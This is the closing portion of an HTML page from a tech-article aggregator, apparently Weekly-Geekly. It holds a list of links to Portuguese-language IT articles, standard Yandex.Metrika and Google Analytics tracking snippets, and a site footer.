<li><a href="../pt439610/index.html">Como no meu ve√≠culo el√©trico Chevrolet Bolt, na garantia, dois m√≥dulos de bateria foram substitu√≠dos e o terceiro sob monitoramento</a></li>
<li><a href="../pt439612/index.html">JavaScript robusto: perseguindo um mito</a></li>
<li><a href="../pt439614/index.html">Como distinguir um reparo bom de um reparo ruim, ou como no SRG criamos uma biblioteca Java multiencadeada a partir do analisador Tomit</a></li>
<li><a href="../pt439616/index.html">O resumo de projetos de TI interessantes no Kickstarter No. 7</a></li>
<li><a href="../pt439620/index.html">Compreendendo a assincronia em JavaScript [Tradu√ß√£o de Sukhjinder Arora]</a></li>
<li><a href="../pt439624/index.html">Por que armazenar dados em √≥rbita</a></li>
<li><a href="../pt439626/index.html">Experi√™ncia no desenvolvimento de um aplicativo gratuito para coletores OpenNumismat</a></li>
<li><a href="../pt439628/index.html">Atualiza√ß√£o de dados paralelos na API da Web do ASP.NET</a></li>
<li><a href="../pt439632/index.html">Como configurar a Implanta√ß√£o Cont√≠nua para o seu projeto: experi√™ncia pessoal</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>